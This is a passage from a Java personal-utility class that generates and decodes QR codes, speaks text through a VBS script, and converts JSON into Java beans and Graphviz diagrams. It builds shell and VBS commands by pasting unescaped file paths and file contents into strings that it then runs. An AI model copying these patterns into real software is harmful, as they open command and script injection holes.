										+ getFileNameNoPoint(srcFile.getName()) + "_" + getTimeStampLong() + ".jpg"));
					}
					targetFileList.add(targetFile);

					System.out.println("operation -> " + lineIndex);
				}

				if (targetFileList.size() == 1) {
					String commandOne = " open  " + targetFileList.get(0).getAbsolutePath();
//                    RuntimeUtil.exec(" open  " + targetFileList.get(0).getAbsolutePath());
					execute_Mac(commandOne);

				} else {

					int width = targetFileList.size() * 300;
					if (width >= 3000) {
						width = 3000;
					}

					int high = targetFileList.size() % 10 == 0 ? (targetFileList.size() / 10) * 300
							: ((targetFileList.size() / 10) * 300 + 300);
					if (high >= 1500) {
						high = 1500;
					}

					BufferedImage combined = new BufferedImage(width, high, BufferedImage.TYPE_INT_RGB);
					Graphics g = combined.getGraphics();

					for (int i = 0; i < targetFileList.size(); i++) {
						int LineNum = i + 1;
						File QrFile = targetFileList.get(i);
						BufferedImage originImage = getBufferedImage(QrFile);
						int temp_x = 300 * (i % 10);
						int temp_y = 300 * (i / 10);

						System.out.println("绘制第 " + LineNum + " 图片! " + "x=" + temp_x + " y =" + temp_y + "   QrFile = "
								+ QrFile.exists() + "  路径:" + QrFile.getAbsolutePath());

						g.drawImage(originImage, temp_x, temp_y, null);
					}
					File endTargetFile = new File(I9_OUT_DIR.getAbsolutePath() + File.separator + "Qr_"
							+ getFileNameNoPoint(srcFile.getName()) + "_" + getTimeStampLong() + ".jpg");
					endTargetFile.createNewFile();
					ImageIO.write(combined, "jpg", endTargetFile);
					String showJpgCommand = "open  " + endTargetFile.getAbsolutePath();
//                    System.out.println("rundll32.exe C:\\\\Windows\\\\System32\\\\shimgvw.dll,ImageView_Fullscreen  " + endTargetFile.getAbsolutePath());
					System.out.println("命令: " + showJpgCommand);
					execute_Mac(showJpgCommand);
//                    RuntimeUtil.exec("rundll32.exe C:\\\\Windows\\\\System32\\\\shimgvw.dll,ImageView_Fullscreen  " + endTargetFile.getAbsolutePath());

				}

//                File endTarget = calculQrEndTarget(targetFileList);
//
//                RuntimeUtil.exec("rundll32.exe C:\\\\Windows\\\\System32\\\\shimgvw.dll,ImageView_Fullscreen  " + endTarget.getAbsolutePath());

				/*
				 * QrConfig config = new QrConfig();
				 *
				 * File targetFile = QrCodeUtil.generate (qrCodeString, config, new
				 * File(I9_OUT_DIR.getAbsolutePath() + File.separator +
				 * getFileNameNoPoint(srcFile.getName())+"_"+getTimeStampLong()+".jpg"));
				 *
				 * RuntimeUtil.
				 * exec("rundll32.exe C:\\\\Windows\\\\System32\\\\shimgvw.dll,ImageView_Fullscreen  "
				 * + targetFile.getAbsolutePath());
				 */

			} catch (Exception e) {
				System.out.println("Exception ! ");
				e.printStackTrace();
			}
		} else {
			System.out.println("Failed !");
		}
	}
	// Rule_15 End 读取文件的第一行转为 二维码显示出来 B1

	/**
	 * 执行 mac(unix) 脚本命令~
	 *
	 * @param command
	 * @return
	 */
	public static int execute_Mac(String command) {
		String[] cmd = { "/bin/bash", "-c", command };
		Runtime rt = Runtime.getRuntime();
		Process proc = null;
		try {
			proc = rt.exec(cmd);
		} catch (IOException e) {
			e.printStackTrace();
		}

		// 打开流
//        OutputStream os = proc.getOutputStream();
//        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(os));

		try {
//            String newCommand = "/bin/bash -c "+"\""+command+"\"";
//            System.out.println("newCommand = " + newCommand);

//            bw.write(newCommand);

//
//            bw.flush();
//            bw.close();

			/** 真奇怪，把控制台的输出打印一遍之后竟然能正常终止了~ */
//            readConsole(proc);

			/** waitFor() 的作用在于 java 程序是否等待 Terminal 执行脚本完毕~ */
			proc.waitFor();
			Thread.sleep(100000);

		} catch (Exception e) {
			e.printStackTrace();
		}
//        int retCode = proc.exitValue();
//        if (retCode != 0) {
//            System.out.println("unix script retCode = " + retCode);
//
//            System.out.println(readConsole(proc));
//            System.out.println("UnixScriptUil.execute 出错了!!");
//        }

		return 0;
	}

	/**
	 * 读取控制命令的输出结果 原文链接：http://lavasoft.blog.51cto.com/62575/15599
	 *
	 * @param
	 * @return 控制命令的输出结果
	 * @throws IOException
	 */
	public static String readConsole(Process process) {
		StringBuffer cmdOut = new StringBuffer();
		InputStream fis = process.getInputStream();
		BufferedReader br = new BufferedReader(new InputStreamReader(fis));

		String line = null;
		try {
			while ((line = br.readLine()) != null) {
				cmdOut.append(line).append(System.getProperty("line.separator"));
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
//       System.out.println("执行系统命令后的控制台输出为：\n" + cmdOut.toString());
		return cmdOut.toString().trim();
	}

	// 默认 只显示 第一行的 字符串
	// Rule_15 Begin 读取文件的第一行转为 二维码显示出来 B1
	@SuppressWarnings("unchecked")
	public static String Image2QrCode_Rule_24_Win(File srcFile) {
		String qrStr = "";

		try {
			MultiFormatReader formatReader = new MultiFormatReader();
			BufferedImage bufferedImage = ImageIO.read(srcFile);
			BinaryBitmap binaryBitmap = new BinaryBitmap(
					new HybridBinarizer(new BufferedImageLuminanceSource(bufferedImage)));
			// 定义二维码参数
//            Map hints = new HashMap<>();
//            hints.put(EncodeHintType.CHARACTER_SET, "utf-8");
//            Result result = formatReader.decode(binaryBitmap, hints);
			Result result = formatReader.decode(binaryBitmap);
			qrStr = result.getText();
			System.out.println("解析二维码数据成功 对于  File---> " + srcFile.getAbsolutePath() + "  【" + qrStr + "】");
		} catch (Exception e) {
			System.out.println("解析二维码数据失败 对于  File---> " + srcFile.getAbsolutePath());
		}
		return qrStr;

	}
	// Rule_15 End 读取文件的第一行转为 二维码显示出来 B1

	// 默认 只显示 第一行的 字符串
	// Rule_15 Begin 读取文件的第一行转为 二维码显示出来 B1
	public static void TextAs_QrCode_Rule_15_Win(File srcFile) {
		File curFile = srcFile;
		ArrayList<String> TxtContent = new ArrayList<String>();
		ArrayList<String> Pre50_Content = new ArrayList<String>();

		if (curFile != null) {

			try {
				BufferedReader curBR = new BufferedReader(new InputStreamReader(new FileInputStream(curFile), "utf-8"));
				String qrCodeString = "";

//                while (qrCodeString != null && qrCodeString.trim().isEmpty()) {
				while (qrCodeString != null) {
					qrCodeString = curBR.readLine();
					TxtContent.add(qrCodeString);
				}
				System.out.println("把扫描到的第一行非空字符串转为二维码  qrCodeString = " + qrCodeString);

				curBR.close();

				int lineNum = 1;
				for (int i = 0; i < TxtContent.size(); i++) {

					String lineStr = TxtContent.get(i);
					System.out.println("line[" + lineNum + "] = " + lineStr);
					lineNum++;
					if (Pre50_Content.size() < 50 && lineStr != null) {
						Pre50_Content.add(lineStr);
					}
				}

				QrConfig config = new QrConfig();
				ArrayList<File> targetFileList = new ArrayList<File>();
				for (int i = 0; i < Pre50_Content.size(); i++) {
					int lineIndex = i + 1;
					String content = Pre50_Content.get(i).trim();
					boolean isEmpty = "".equals(content);
					boolean isUrl = isValidUrl_String(content);
					File targetFile = null;
					if (isEmpty) {
						targetFile = calculBlankIndex(I9_Qr_Black_Image_File, lineIndex);
					} else {
						targetFile = QrCodeUtil.generate(content, config,
								new File(I9_OUT_DIR.getAbsolutePath() + File.separator
										+ getFileNameNoPoint(srcFile.getName()) + "_" + getTimeStampLong() + ".jpg"));
					}
					targetFileList.add(targetFile);

					System.out.println("operation -> " + lineIndex);
				}

				if (targetFileList.size() == 1) {
					RuntimeUtil.exec("rundll32.exe C:\\\\Windows\\\\System32\\\\shimgvw.dll,ImageView_Fullscreen  "
							+ targetFileList.get(0).getAbsolutePath());

				} else {

					int width = targetFileList.size() * 300;
					if (width >= 3000) {
						width = 3000;
					}

					int high = targetFileList.size() % 10 == 0 ? (targetFileList.size() / 10) * 300
							: ((targetFileList.size() / 10) * 300 + 300);
					if (high >= 1500) {
						high = 1500;
					}

					BufferedImage combined = new BufferedImage(width, high, BufferedImage.TYPE_INT_RGB);
					Graphics g = combined.getGraphics();

					for (int i = 0; i < targetFileList.size(); i++) {
						int LineNum = i + 1;
						File QrFile = targetFileList.get(i);
						BufferedImage originImage = getBufferedImage(QrFile);
						int temp_x = 300 * (i % 10);
						int temp_y = 300 * (i / 10);

						System.out.println("绘制第 " + LineNum + " 图片! " + "x=" + temp_x + " y =" + temp_y + "   QrFile = "
								+ QrFile.exists() + "  路径:" + QrFile.getAbsolutePath());

						g.drawImage(originImage, temp_x, temp_y, null);
					}
					File endTargetFile = new File(I9_OUT_DIR.getAbsolutePath() + File.separator + "Qr_"
							+ getFileNameNoPoint(srcFile.getName()) + "_" + getTimeStampLong() + ".jpg");
					endTargetFile.createNewFile();
					ImageIO.write(combined, "jpg", endTargetFile);
					System.out.println("rundll32.exe C:\\\\Windows\\\\System32\\\\shimgvw.dll,ImageView_Fullscreen  "
							+ endTargetFile.getAbsolutePath());
					RuntimeUtil.exec("rundll32.exe C:\\\\Windows\\\\System32\\\\shimgvw.dll,ImageView_Fullscreen  "
							+ endTargetFile.getAbsolutePath());

				}

//                File endTarget = calculQrEndTarget(targetFileList);
//
//                RuntimeUtil.exec("rundll32.exe C:\\\\Windows\\\\System32\\\\shimgvw.dll,ImageView_Fullscreen  " + endTarget.getAbsolutePath());

				/*
				 * QrConfig config = new QrConfig();
				 *
				 * File targetFile = QrCodeUtil.generate (qrCodeString, config, new
				 * File(I9_OUT_DIR.getAbsolutePath() + File.separator +
				 * getFileNameNoPoint(srcFile.getName())+"_"+getTimeStampLong()+".jpg"));
				 *
				 * RuntimeUtil.
				 * exec("rundll32.exe C:\\\\Windows\\\\System32\\\\shimgvw.dll,ImageView_Fullscreen  "
				 * + targetFile.getAbsolutePath());
				 */

			} catch (Exception e) {
				System.out.println("Exception ! ");
				e.printStackTrace();
			}
		} else {
			System.out.println("Failed !");
		}
	}
	// Rule_15 End 读取文件的第一行转为 二维码显示出来 B1

	// zukgit
	static File calculBlankIndex(File imageFile, int Index) {
		File blockFile = new File(I9_OUT_DIR.getAbsolutePath() + File.separator + "Block" + "_" + Index + "_"
				+ getTimeStampLong() + ".jpg");

		String imageType = getFileTypeWithPoint(imageFile.getName());
		String type_fixed = imageType.replace(".", "").trim();
		int originHigh = getImageHigh(imageFile);
		int originWidth = getImageWidth(imageFile);
		BufferedImage originImage = getBufferedImage(imageFile);

		BufferedImage combined = new BufferedImage(originWidth, originHigh, BufferedImage.TYPE_INT_RGB);
		// paint both images, preserving the alpha channels
		Graphics g = combined.getGraphics();
		int padding = 20;

		try {
			g.setColor(Color.RED);
			Font font = new Font("微软雅黑", Font.PLAIN, 100);
			g.setFont(font);
			FontMetrics metrics = g.getFontMetrics(font);
			int x = 0 + (originWidth - metrics.stringWidth("" + Index)) / 2;
			int y = 0 + ((originHigh - metrics.getHeight()) / 2) + metrics.getAscent();
			g.drawImage(originImage, 0, 0, null);
			g.drawString(Index + "", x, y);

			// Save as new image
			ImageIO.write(combined, type_fixed, blockFile);
		} catch (Exception e) {
			System.out.println("发生异常! ");

		} finally {
			if (g != null) {
				g.dispose();
			}
		}

		return blockFile;
	}

	public static BufferedImage resize(Image mImage, int w, int h) {
		// SCALE_SMOOTH 的缩略算法 生成缩略图片的平滑度的 优先级比速度高 生成的图片质量比较好 但速度慢
		BufferedImage image = new BufferedImage(w, h, BufferedImage.TYPE_INT_RGB);
		Graphics g = image.getGraphics();
		try {
			g.drawImage(mImage, 0, 0, w, h, null); // 绘制缩小后的图
		} finally {
			if (g != null) {
				g.dispose();
			}
		}
		return image;
		// File destFile = new File("C:\\temp\\456.jpg");
		// FileOutputStream out = new FileOutputStream(destFile); // 输出到文件流
		// // 可以正常实现bmp、png、gif转jpg
		// JPEGImageEncoder encoder = JPEGCodec.createJPEGEncoder(out);
		// encoder.encode(image); // JPEG编码
		// out.close();
	}

	public static BufferedImage getBufferedImage(File file) {
		Image img = null;
		try {
			img = ImageIO.read(file); // 构造Image对象
		} catch (Exception e) {
			System.out.println(e);
			return null;
		}

		int width = img.getWidth(null); // 得到源图宽
		int height = img.getHeight(null); // 得到源图长

//    return resizeFix(400, 492);
		return resize(img, width, height);
	}

	// zukgit
	static File calculQrEndTarget(ArrayList<File> srcFileList) {
		File targetFile = new File(
				I9_OUT_DIR.getAbsolutePath() + File.separator + "Qr" + "_" + getTimeStampLong() + ".jpg");

		for (int i = 0; i < srcFileList.size(); i++) {

		}

		return targetFile;
	}

	// Rule_16 Begin Windows 读物当前文件内容 并 播放 vbs 声音
	public static void ReadStrFromFile_Rule_16(File srcFile) {
		File curFile = srcFile;
		String ReadCotent = ReadFileContent(srcFile);

		String fixedStr = ReadCotent.replaceAll("\r|\n", "");
		fixedStr = fixedStr.replaceAll(" ", "");
		System.out.println("读取内容 fixedStr = " + fixedStr);
		String source = new String(fixedStr);

		// 创建vbs 并执行它 CreateObject("SAPI.SpVoice").Speak "你好，2019"

		String mVbsFilePath = I9_OUT_DIR_PATH + File.separator + getTimeStampLong() + "_voice.vbs";
		String commadStr = "CreateObject(\"SAPI.SpVoice\").Speak \"" + source + "\"";

		File file = new File(mVbsFilePath);
		if (!file.exists()) {
			try {
				file.createNewFile();
				BufferedWriter curBW = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file), "utf-8"));
				curBW.write(commadStr);
				curBW.close();
			} catch (Exception e) {

			}
		}
		RuntimeUtil.exec("Wscript.exe  /x " + file);
		System.out.println("执行操作:   " + "Wscript.exe  /x " + file);
	}
	// Rule_16 End Windows 读物当前文件内容 并 播放 vbs 声音

	// Rule_17 Begin 对 Json 格式的文件 或者 以json格式保存的文件 生成bean文件 以及 Graphviz 绘图显示结构

	// ProperityItem(String ownnerClassName, String properityName, String TypeName,
	// String refClassName)

	static ArrayList<String> Rule17_dotStringArr = new ArrayList<String>();
	static ArrayList<HashMap<String, ArrayList<ProperityItem>>> Rule17_arrMapList = new ArrayList<HashMap<String, ArrayList<ProperityItem>>>();
	// 对 ArrayList 进行 排序

	static String Rule17_Rule17_outFilepath = "";
	static File Rule17_outFile = null;
	static String Rule17_dot_targetFilePath = "";
	static String Rule17_dirPath = ""; // zbin 路径

	static void Rule17_tryWriteJsonToFile(ArrayList<String> Rule17_dotStringArr, File file, String netAddr) {

		if (file != null && file.exists()) {

			try {
// String curItem = "#  "+new String(netAddr);
				BufferedWriter curBW = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file), "utf-8"));
				// curBW.write(curItem);
				for (int i = 0; i < Rule17_dotStringArr.size(); i++) {
					curBW.write(Rule17_dotStringArr.get(i));
					curBW.newLine();
				}
				curBW.close();
				System.out.println("OK !");
				System.out.println("write json File OK !");
			} catch (IOException e) {
				e.printStackTrace();
			}
		} else {
			System.out.println("Failed !");
		}
	}

	public static String Rule17_decode(String url) {
		try {
			String prevURL = "";
			String decodeURL = url;
			while (!prevURL.equals(decodeURL)) {
				prevURL = decodeURL;
				decodeURL = URLDecoder.decode(decodeURL, "UTF-8");
			}
			return decodeURL;
		} catch (UnsupportedEncodingException e) {
			return "Issue while decoding" + e.getMessage();
		}
	}

	public static String Rule17_encode(String url) {
		try {
			String encodeURL = URLEncoder.encode(url, "UTF-8");
			return encodeURL;
		} catch (UnsupportedEncodingException e) {
			return "Issue while encoding" + e.getMessage();
		}
	}

	static void tryReadJsonFromFile(StringBuilder sb, File file) {

		if (file != null && file.exists()) {

			try {
				BufferedReader curBR = new BufferedReader(new InputStreamReader(new FileInputStream(file), "utf-8"));
				String lineStr = "";

				while (lineStr != null) {
					lineStr = curBR.readLine();
					if (lineStr == null || lineStr.trim().isEmpty()) {
						continue;
					}

					sb.append(lineStr.trim());
				}
				curBR.close();

				System.out.println("read json File OK !");
			} catch (IOException e) {
				e.printStackTrace();
			}
		} else {
			System.out.println("Failed !");
		}
	}

	public static void Make_Json_As_JavaFile_Rule_17(File srcFile, File resultDirFile) {

		try {
			Rule17_dirPath = I9_OUT_DIR_PATH;

			Rule17_Rule17_outFilepath = Rule17_dirPath + File.separator + getTimeStampLong() + ".gv";

			StringBuilder sb = new StringBuilder();
			System.out.println("curFile = " + srcFile.getAbsolutePath());

			tryReadJsonFromFile(sb, srcFile);

			String firstArrChar = sb.toString().substring(0, 1);
			while (firstArrChar != null && !(firstArrChar.equals("{") || firstArrChar.equals("["))) {

				sb = new StringBuilder(sb.toString().trim().substring(1));
				System.out.println("注意: 不是以{ 或者 [ 开头  firstArrChar=" + firstArrChar);
				firstArrChar = sb.toString().substring(0, 1);
			}

			boolean isArrJson = sb.toString().startsWith("[");
			if (isArrJson) {
				sb = new StringBuilder("{ arr:" + sb.toString() + "}");
				System.out.println("读取到的字符是[开头的!  firstArrChar=" + firstArrChar);
			} else {
				System.out.println("读取到的字符不是[开头的!  firstArrChar=" + firstArrChar);
				// 读取到的字符不是[开头的! firstArrChar=?
			}

			if (sb.toString().trim().equals("")) {
				System.out.println("读取到的Json 文件为空  退出!!");
				return;
			}

			String firstChar = sb.toString().substring(0, 1);
			while (firstChar != null && !firstChar.equals("{")) {
				sb = new StringBuilder(sb.toString().trim().substring(1));
				System.out.println("注意: 不是以{ 开头  firstChar=" + firstChar);
				firstChar = sb.toString().substring(0, 1);

			}
			if (!JSONUtil.isJson(sb.toString().trim())) {
				System.out.println("读取到的文件不是标准的Json 格式 退出!  当前读取到的数据为:\n" + sb.toString());
				System.out.println("读取到的文件不是标准的Json 格式 退出!  firstChar 第一个字符为:\n" + sb.toString().substring(0, 1));
				System.out.println("读取到的文件不是标准的Json 格式 退出!  第二个字符为:\n" + sb.toString().substring(1, 2));
				return;
			}

			Rule17_outFile = new File(Rule17_Rule17_outFilepath);
			Rule17_dot_targetFilePath = Rule17_outFile.getParentFile().getAbsolutePath() + File.separator
					+ getFileNameNoPoint(Rule17_outFile.getName());
			if (!Rule17_outFile.exists()) {
				Rule17_outFile.createNewFile();
			}

//            System.out.println(JsonFormat.format(s));
//            new Json2Bean(s, "RootBean", new MyNameGenerator(), new MyJsonParser(), new MyBeanGenerator("com.test5")).execute();
//
//
//            s = "{\"multyList\":[[[{\"name\":\"xm1\",\"age\":19}]]]}";

			// System.out.println(toujiaoJson);

			I9_TextRuleOperation I9_Object = new I9_TextRuleOperation();
			JSONObject day_jsonobject = JSONObject.parseObject(sb.toString());
			ArrayList<String> orikeyList = new ArrayList<String>();
			ArrayList<String> fixed_clearChinese_keyList = new ArrayList<String>();
			if (day_jsonobject != null && day_jsonobject.keySet().size() > 0) {
				orikeyList.addAll(day_jsonobject.keySet());
			}
			if (orikeyList.size() > 0) {
				for (int i = 0; i < orikeyList.size(); i++) {
					String keyname = orikeyList.get(i);
					String keyname_revert_pinyinStr = Rule14_ToPinyin_WithFirstBig(keyname);
					fixed_clearChinese_keyList.add(keyname_revert_pinyinStr);

				}

			}

			String result = new Json2Bean(sb.toString(), "RootBean", null,
					new MyNameGenerator(fixed_clearChinese_keyList), new MyJsonParser(),
					new MyBeanGenerator("com.zukgit")).execute();
//            String result = new Json2Bean(sb.toString(), "RootBean", null, new MyNameGenerator(), new MyJsonParser(), new MyBeanGenerator("com.zukgit")).execute();

			System.out.println("------------------------------");
			System.out.println("result = " + result);
//
//            List<List<List<String>>> list = new ArrayList<>();
//
//            List<List<String>> li1 = new ArrayList<List<String>>();
//            li1.add(Arrays.asList("d", "e", "f"));
//            li1.add(Arrays.asList("d1", "e1", "f1"));
//
//            List<List<String>> li2 = new ArrayList<List<String>>();
//            li2.add(Arrays.asList("d", "e", "f"));
//            li2.add(Arrays.asList("d2", "e2", "f2"));
//
//            list.add(li1);
//            list.add(li2);
//
//
//            s = JSON.toJSONString(list);
//            System.out.println(s);
//            new Json2Bean(s, "RootBean", new MyNameGenerator(), new MyJsonParser(), new MyBeanGenerator("com.test3")).execute();
//
//            System.out.println("------------------------------");
//
//            s = "{\"post_message\":\"[:f002}[:f003}[:f003}[:f004}[:f004}\",\"intlist\":[1,2,3],\"str\":\"{}\"}";
//            System.out.println(JsonFormat.format(s));
//            new Json2Bean(s, "RootBean", new MyNameGenerator(), new MyJsonParser(), new MyBeanGenerator("com.test4")).execute();
//
//            s = "[[[{\"name\":\"xm1\",\"age\":19},{\"name\":\"[xm2\",\"age\":19},{\"name\":\"{xm3\",\"age\":19}],[{\"name\":\"[[xm4\",\"age\":19},{\"name\":\"{{xm5\",\"age\":19}]],[[{\"name\":\"xm6\",\"age\":19},{\"name\":\"xm7\",\"age\":19}],[{\"name\":\"xm8\",\"age\":19}]]]";
//            System.out.println(JsonFormat.format(s));
//            new Json2Bean(s, "RootBean", new MyNameGenerator(), new MyJsonParser(), new MyBeanGenerator("com.test5")).execute();
//
//
//            s = "{\"multyList\":[[[{\"name\":\"xm1\",\"age\":19}]]]}";
//            System.out.println(JsonFormat.format(s));
//            new Json2Bean(s, "RootBean", new MyNameGenerator(), new MyJsonParser(), new MyBeanGenerator("com.test6")).execute();

			System.out.println(" arrArrList.size()" + Rule17_arrMapList.size());
			int index = 0;
//            Rule17_arrMapList.sort(new Comparator<HashMap<String, ArrayList<ProperityItem>>>() {
//                @Override
//                public int compare(HashMap<String, ArrayList<ProperityItem>> o1, HashMap<String, ArrayList<ProperityItem>> o2) {
//                    int lengthO1 = 0;
//                    int lengthO2 = 0;
//                    Iterator<Map.Entry<String, ArrayList<ProperityItem>>> itr_o1 = o1.entrySet().iterator();
//                    while (itr_o1.hasNext()) {
//                        Map.Entry<String, ArrayList<ProperityItem>> entry_o1 = itr_o1.next();
//                        String k = entry_o1.getKey();
//                        ArrayList<ProperityItem> o1Arr =  entry_o1.getValue();
//                        lengthO1 = o1Arr.size() + lengthO1;
//                    }
//
//                    Iterator<Map.Entry<String, ArrayList<ProperityItem>>> itr_o2 = o2.entrySet().iterator();
//                    while (itr_o2.hasNext()) {
//                        Map.Entry<String, ArrayList<ProperityItem>> entry_o2 = itr_o2.next();
//                        String k = entry_o2.getKey();
//                        ArrayList<ProperityItem> o2Arr =  entry_o2.getValue();
//                        lengthO2 = o2Arr.size() + lengthO2;
//                    }
//                    if(lengthO1 > lengthO2){
//                        return 1;
//                    } else{
//                        return -1;
//                    }
//                }
//            });
			// https://dreampuf.github.io/GraphvizOnline/#
			Rule17_dotStringArr.add("digraph {");
			Rule17_dotStringArr.add("#   zzfile_3.bat  " + Rule17_OutRealJava_Path + "      ##  生成的java代码地址");
			Rule17_dotStringArr.add("#    https://dreampuf.github.io/GraphvizOnline/  #      Giraphz图形地址 ");
			Rule17_dotStringArr.add("#    http://www.bejson.com/jsonviewernew/    Json 数据 \n");
			Rule17_dotStringArr.add("#     dot  " + Rule17_Rule17_outFilepath + " -Tpdf -o " + Rule17_dot_targetFilePath
					+ ".pdf  生成PDF \n");
			Rule17_dotStringArr.add("#     dot  " + Rule17_Rule17_outFilepath + " -Tpng -o " + Rule17_dot_targetFilePath
					+ ".png    生成PNG   \n");
			Rule17_dotStringArr.add("graph [rankdir=BT] \n");
			System.out.println("===============index" + index + "=============== Begin");

			for (Map<String, ArrayList<ProperityItem>> arr : Rule17_arrMapList) {

				// System.out.println("===============index" + index + "=============== Begin");

				Iterator<Map.Entry<String, ArrayList<ProperityItem>>> itr = arr.entrySet().iterator();

				while (itr.hasNext()) {
					Map.Entry<String, ArrayList<ProperityItem>> entry = itr.next();
					String k = entry.getKey();
					ArrayList<ProperityItem> properArr = entry.getValue();
					int subindex = 0;
					// System.out.println("开始打印 ClassName = 【" + k + "】 ");
					for (ProperityItem properityItem : properArr) {
						System.out.println("ClassName = 【" + k + "】 index =【" + index + " 】   subIndex=【" + subindex
								+ "】  str=" + properityItem.toString());
//                        subindex++;
						System.out.println(properityItem.makeNodeString());
						Rule17_dotStringArr.add(properityItem.makeNodeString());

					}
					for (ProperityItem properityItem : properArr) {
						// System.out.println(properityItem.makeNodeRelationString());
						Rule17_dotStringArr.add(properityItem.makeNodeRelationString());
					}

				}
				// System.out.println("===============index" + index + "=============== End");
				index++;

			}
			Rule17_dotStringArr.add("} \n");
			System.out.println("==============Rule17_dotStringArr=============== Begin");
			StringBuilder urlSB = new StringBuilder();
			for (String item : Rule17_dotStringArr) {
				System.out.println(item);
				urlSB.append(item);
			}
			String encodeStr = Rule17_encode(urlSB.toString());
			encodeStr = encodeStr.replaceAll("\\+", "%20");

			encodeStr = encodeStr.replaceAll("\\+", "%20");
			encodeStr = encodeStr.replaceAll("%7B", "%7B%0A%0A%20%20");
			encodeStr = encodeStr.replaceAll("%3B", "%3B%0A%20%20%20%20");

			String netAddr = "https://dreampuf.github.io/GraphvizOnline/#" + encodeStr;
			Rule17_tryWriteJsonToFile(Rule17_dotStringArr, Rule17_outFile, netAddr);
			rule17_resultFile_List.add(Rule17_outFile);
//  浏览器地址最多接受 4096个字符  所以 无法通过编译 .gv 文件来跳转到 对应的 graviz页面

			JavaRuntimeInfo javaRuntimeInfo = new JavaRuntimeInfo();
			System.out.println("=========================runtimeInfo=========================\n" + javaRuntimeInfo);
			String libPath = javaRuntimeInfo.getLibraryPath();
			String dotPath = "";
			// ;C:\Program Files (x86)\Graphviz2.38\bin\dot.exe;

			System.out.println("libPath = " + libPath);
			if (libPath.contains("Graphviz")) {
//            if(libPath.contains("Graphviz") && libPath.contains("dot")){
				String[] libArr = libPath.split(";");
				int length = libArr.length;

				for (int i = 0; i < length; i++) {
//                    if(libArr[i].contains("Graphviz") && libArr[i].contains("dot")){
					if (libArr[i].toLowerCase().contains("Graphviz".toLowerCase())) {
						dotPath = libArr[i];
						break;
					}
				}
			}
			if (!"".equals(dotPath) && dotPath.endsWith("dot")) {
				if (dotPath.endsWith(File.separator)) {
					dotPath = dotPath + "dot";
				} else {
					dotPath = dotPath + File.separator + "dot";
				}
			}

			System.out.println("zukgit  dotPath.substring  dotPath =" + dotPath);
			String dotRule17_dirPath = "";
			if (dotPath != null && !dotPath.isEmpty()) {
				dotRule17_dirPath = dotPath.substring(0, dotPath.lastIndexOf("\\"));
				dotPath = "\"" + dotPath + "\"";
				dotRule17_dirPath = "\"" + dotRule17_dirPath + "\"";
				// dot ./B6.gv -Tpdf -o B6.pdf
				System.out.println("dotRule17_dirPath 1  = " + dotRule17_dirPath);
				File outputPdfFile = new File(Rule17_outFile.getParentFile().getAbsolutePath() + File.separator
						+ getFileNameNoPoint(Rule17_outFile.getName()) + ".pdf");
				String command = " cmd.exe /c cd " + dotRule17_dirPath + "  &&  dot.exe  "
						+ Rule17_outFile.getAbsolutePath() + " -Tpdf -o  "
						+ Rule17_outFile.getParentFile().getAbsolutePath() + File.separator
						+ getFileNameNoPoint(Rule17_outFile.getName()) + ".pdf";

				System.out.println("command = " + command);
				// RuntimeUtil.exec(command);
				String procResult = Rule17_execCMD(command); // 生成PDF 文件
				System.out.println("command = " + command + " procResult=" + procResult);

				// command = cmd.exe /c C:\Program Files (x86)\Graphviz2.38\bin && dot.exe
				// C:\work_space\eclipse_workplace\B6\B6.gv -Tpdf -o
				// C:\work_space\eclipse_workplace\B6\B6.pdf
// cmd.exe /c cd "C:\Program Files (x86)\Graphviz2.38\bin"  &&  dot.exe  C:\work_space\eclipse_workplace\B6\B6.gv -Tpdf -o  C:\work_space\eclipse_workplace\B6\B6.pdf
				String command2 = "cmd.exe /C start acrord32  " + outputPdfFile.getAbsolutePath();
				Thread.sleep(2000);
				String procResult2 = Rule17_execCMD(command2); // 打开 acrord32 Adobe 阅读 PDF 文件
				System.out.println("command2 = " + command2 + " procResult=" + procResult2);
				rule17_resultFile_List.add(outputPdfFile);

			}
			String command3 = "cmd.exe /C start notepad++  " + Rule17_outFile.getAbsolutePath();
			String procResult3 = Rule17_execCMD(command3); // 使用notepad 打开 gv 文件
			System.out.println("command3 = " + command3 + " procResult3=" + procResult3);

			String command4 = "";
			System.out.println("netAddr =   " + netAddr);
			if (netAddr.length() > 4000) {
				command4 = "cmd.exe /C start chrome   https://dreampuf.github.io/GraphvizOnline/ ";

			} else {

				command4 = "cmd.exe /C start chrome  " + netAddr;

			}
			// String command4 = "cmd.exe /C start chrome " +netAddr;

			String command5 = "cmd.exe /C start chrome   http://www.bejson.com/jsonviewernew/ ";

			String procResult5 = Rule17_execCMD(command5); // 使用 Chrome 打开 JSON在线解析

			String procResult4 = Rule17_execCMD(command4); // 使用 Chrome 打开 Graphiz 在线解析网页
			System.out.println("command5 = " + command5 + " procResult5=" + procResult5);
			System.out.println("dotPath = " + dotPath);
			if (dotPath != null && !dotPath.isEmpty()) {
// command6   生成 Png 照片
				// String command6 = "cmd.exe /C start chrome
				// http://www.bejson.com/jsonviewernew/ ";
				File pngFile = new File(Rule17_outFile.getParentFile().getAbsolutePath() + File.separator
						+ getFileNameNoPoint(Rule17_outFile.getName()) + ".png");
				//
				// String command6 = " cmd.exe /c cd " +dotRule17_dirPath+ " && dot.exe
				// "+Rule17_outFile.getAbsolutePath() +" -Tpng -o " +
				// Rule17_outFile.getParentFile().getAbsolutePath()+File.separator+ "B6.png";
				String command6 = " cmd.exe /c cd " + dotRule17_dirPath + "  &&  dot.exe  "
						+ Rule17_outFile.getAbsolutePath() + " -Tpng -o  " + pngFile.getAbsolutePath();
				String procResult6 = Rule17_execCMD(command6);
				System.out.println("command6 = " + command6 + " procResult6=" + procResult6);
				// command7 使用照片浏览器打开照片
				String command7 = "rundll32.exe C:\\\\Windows\\\\System32\\\\shimgvw.dll,ImageView_Fullscreen  "
						+ pngFile.getAbsolutePath();
				// RuntimeUtil.exec("rundll32.exe
				// C:\\\\Windows\\\\System32\\\\shimgvw.dll,ImageView_Fullscreen " +
				// pngFile.getAbsolutePath());
				String procResult7 = Rule17_execCMD(command7);
				System.out.println("command7 = " + command7 + " procResult7=" + procResult7);

				rule17_resultFile_List.add(pngFile);

			}

		} catch (Exception e) {

		}

		// System.out.println("Zukgit-----------End");

		for (int i = 0; i < rule17_resultFile_List.size(); i++) {
			File resultFile = rule17_resultFile_List.get(i);
			if (!resultDirFile.exists()) {
				resultDirFile.mkdirs();
			}
			String resultFileName = resultFile.getName();
